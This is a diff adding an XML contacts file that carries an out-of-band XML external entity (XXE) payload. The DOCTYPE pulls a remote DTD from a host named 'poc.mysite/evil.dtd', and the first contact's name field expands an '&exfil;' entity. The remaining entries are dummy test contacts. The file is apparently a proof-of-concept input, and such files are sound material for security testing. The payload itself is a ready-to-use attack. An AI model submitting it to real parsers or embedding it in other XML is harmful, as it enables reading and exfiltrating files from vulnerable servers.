@@ -1,0 +1,17 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<?xml-stylesheet type="text/xsl" href="/contact.xsl"?>
+<!DOCTYPE foo [ <!ELEMENT foo ANY > <!ENTITY % remote SYSTEM "poc.mysite/evil.dtd"> %remote;%param1;]>
+<contacts>
+    <contact>
+        <name>&exfil;</name>
+        <email>ben@test.com</email>
+    </contact>
+    <contact>
+        <name>adam</name>
+        <email>adam@test.com</email>
+    </contact>
+    <contact>
+        <name>test</name>
+        <email>test@test.com</email>
+    </contact>
+</contacts>
